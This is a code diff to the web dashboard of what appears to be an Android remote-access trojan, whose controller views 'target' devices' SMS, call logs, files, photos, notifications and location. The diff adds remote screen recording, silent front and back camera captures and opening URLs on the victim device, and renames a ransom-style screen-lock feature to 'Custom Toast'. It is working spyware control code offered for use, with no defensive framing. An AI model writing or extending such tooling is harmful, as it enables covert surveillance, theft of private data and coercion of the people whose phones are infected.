@@ -84,8 +84,10 @@ let selectedClientId = null;
 let currentModal = null;
 let popupTimeout;
 let flashOn = false;
+let screenRecordOn = false;
 let clientDataCache = {};
 let notificationHashes = new Set();
+let agentMessageHashes = new Set();
 
 const mainGridPanel = document.getElementById('main-grid-panel');
 
@@ -109,6 +111,7 @@ function selectDevice(clientId) {
     if (selectedClientId === clientId) return;
     selectedClientId = clientId;
     flashOn = false; // Reset flash state on device switch
+    screenRecordOn = false; // Reset screen record state
     document.querySelectorAll('.device-item').forEach(el => el.classList.remove('active'));
     document.getElementById(`device-${clientId.replace(/[:.]/g, '-')}`).classList.add('active');
     updateMainDashboard();
@@ -166,9 +169,13 @@ function getGridButtonsHtml(enabled) {
         <button class="grid-btn" ${disabledAttr} onclick="openModal('gallery')"><i class="fas fa-images"></i>Gallery</button>
         <button class="grid-btn" ${disabledAttr} onclick="openModal('notifications')"><i class="fas fa-bell"></i>Notifications</button>
         <button class="grid-btn" ${disabledAttr} onclick="openModal('apps')"><i class="fas fa-th-large"></i>Apps</button>
-        <button class="grid-btn" ${disabledAttr} onclick="openModal('toast')"><i class="fas fa-window-maximize"></i>Screen Lock</button>
-        <button class="grid-btn" ${disabledAttr} id="flash-btn" onclick="toggleFlash()"><i class="fas fa-bolt"></i>Flash OFF</button>
+        <button class="grid-btn" ${disabledAttr} onclick="openModal('toast')"><i class="fas fa-window-maximize"></i>Custom Toast</button>
+        <button class="grid-btn" ${disabledAttr} onclick="openModal('openurl')"><i class="fas fa-external-link-alt"></i>Open URL</button>
         <button class="grid-btn" ${disabledAttr} onclick="sendCommand('get_location')"><i class="fas fa-map-marker-alt"></i>Location</button>
+        <button class="grid-btn" ${disabledAttr} id="flash-btn" onclick="toggleFlash()"><i class="fas fa-bolt"></i>Flash OFF</button>
+        <button class="grid-btn" ${disabledAttr} id="screen-record-btn" onclick="toggleScreenRecord()"><i class="fas fa-video"></i>Record OFF</button>
+        <button class="grid-btn" ${disabledAttr} onclick="sendCommand('takebackpic')"><i class="fas fa-camera-retro"></i>Back Pic</button>
+        <button class="grid-btn" ${disabledAttr} onclick="sendCommand('takefrontpic')"><i class="fas fa-camera"></i>Front Pic</button>
     `;
 }
 
@@ -191,7 +198,6 @@ function closeModal() {
 function fetchInitialDataForModal(modalType) {
     const commands = { sms: 'getsms', calls: 'getcalllogs', filemanager: 'filemanager', gallery: 'gallery', apps: 'list_app' };
     if (commands[modalType]) sendCommand(commands[modalType]);
-    // Notifications are polled, no initial command needed
 }
 
 async function renderModalContent() {
@@ -213,11 +219,15 @@ async function renderModalContent() {
                 </div>`).join('') + '</div>';
             break;
          case 'toast':
-             document.getElementById('modal-title').textContent = 'Screen Lock';
-             body.innerHTML = '<p>Enter text to display on the locked screen. The app will request permission if needed.</p>';
-             footer.innerHTML = `<input type="text" id="toast-text" placeholder="Your text here..." style="flex-grow: 1;"><button onclick="sendToast()">Lock Screen</button><button onclick="sendCommand('toast off')">Unlock</button>`;
+             document.getElementById('modal-title').textContent = 'Display Custom Toast';
+             body.innerHTML = '<p>Enter text to display on the target screen. The app will request permission if needed.</p>';
+             footer.innerHTML = `<input type="text" id="toast-text" placeholder="Your text here..." style="flex-grow: 1;"><button onclick="sendToast()">Show Toast</button><button onclick="sendCommand('toast off')">Hide Toast</button>`;
              break;
-        // Other cases remain the same but use clientData
+         case 'openurl':
+             document.getElementById('modal-title').textContent = 'Open URL';
+             body.innerHTML = '<p>Enter the full URL to open on the target device.</p>';
+             footer.innerHTML = `<input type="text" id="url-text" placeholder="https://example.com" style="flex-grow: 1;"><button onclick="sendOpenUrl()">Open URL</button>`;
+             break;
         case 'sms':
             body.innerHTML = '<table><thead><tr><th>Sender</th><th>Message</th></tr></thead><tbody>' + (clientData.sms_logs || []).map(log => `<tr><td>${log.userSender}</td><td>${log.content}</td></tr>`).join('') + '</tbody></table>';
             break;
@@ -247,6 +257,7 @@ async function renderModalContent() {
 
 // Actions
 function sendToast() { const text = document.getElementById('toast-text').value; if (text) sendCommand(`toast on ${text}`); }
+function sendOpenUrl() { const url = document.getElementById('url-text').value; if (url) sendCommand(`openurl ${url}`); }
 function handleFmAction(action, fileName) {
     if (action === 'rename') {
         const selectedFile = prompt('Which file to rename?');
@@ -265,6 +276,16 @@ function toggleFlash() {
       btn.style.color = flashOn ? 'yellow' : 'var(--border-color)';
     }
 }
+function toggleScreenRecord() {
+    screenRecordOn = !screenRecordOn;
+    sendCommand(screenRecordOn ? 'screenrecord start' : 'screenrecord stop');
+    const btn = document.getElementById('screen-record-btn');
+    if (btn) {
+      btn.innerHTML = `<i class="fas fa-video"></i>Record ${screenRecordOn ? 'ON' : 'OFF'}`;
+      btn.style.color = screenRecordOn ? 'red' : 'var(--border-color)';
+    }
+}
+
 function showPopup(type, message) {
     const popup = document.getElementById('popup-overlay');
     document.getElementById('popup-content').innerHTML = message;
@@ -290,6 +311,15 @@ async function pollStatus() {
                 // Location URL popup
                 if (clientData.location_url) {
                     showPopup('location', `Location: <a href="${clientData.location_url}" target="_blank">Open Map</a>`);
+                }
+                // Generic agent message popup
+                if (clientData.agent_messages && clientData.agent_messages.length > 0) {
+                    const latestMsg = clientData.agent_messages[0];
+                    const msgHash = `${device.id}-${latestMsg}`;
+                    if (!agentMessageHashes.has(msgHash)) {
+                        showPopup('agent_message', latestMsg);
+                        agentMessageHashes.add(msgHash);
+                    }
                 }
                 // Notification popup
                 if (clientData.notifications && clientData.notifications.length > 0) {
